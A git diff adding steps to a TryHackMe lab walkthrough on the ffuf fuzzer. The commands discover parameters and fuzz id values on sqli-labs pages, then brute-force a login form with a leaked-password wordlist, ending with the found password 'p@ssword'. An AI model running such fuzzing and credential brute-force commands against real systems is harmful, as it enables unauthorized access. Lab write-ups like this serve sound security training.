@@ -87,3 +87,30 @@ ffuf -u http://10.10.195.108/FUZZ -w /usr/share/seclists/Discovery/Web-Content/r
 ```
 
 ![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a62c095d-8a59-44dd-9d8e-b7c918e4f98b)
+
+```
+ffuf -u 'http://10.10.2.199/sqli-labs/Less-1/?FUZZ=1' -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw 39
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a432e207-6089-4aeb-a667-3adc32cfc06d)
+
+```
+ffuf -u 'http://10.10.2.199/sqli-labs/Less-1/?FUZZ=1' -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fw 39
+```
+
+```
+ruby -e '(0..255).each{|i| puts i}' | ffuf -u 'http://10.10.2.199/sqli-labs/Less-1/?id=FUZZ' -c -w - -fw 33
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/ad3f1cf2-8e3b-4f6b-ad33-e3b699af02e6)
+
+```
+ffuf -u http://10.10.2.199/sqli-labs/Less-11/ -c -w /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -fs 1435 -H 'Content-Type: application/x-www-form-urlencoded'
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/55b10a81-cd77-4864-a777-89c7d9150dca)
+
+```
+p@ssword
+```
+
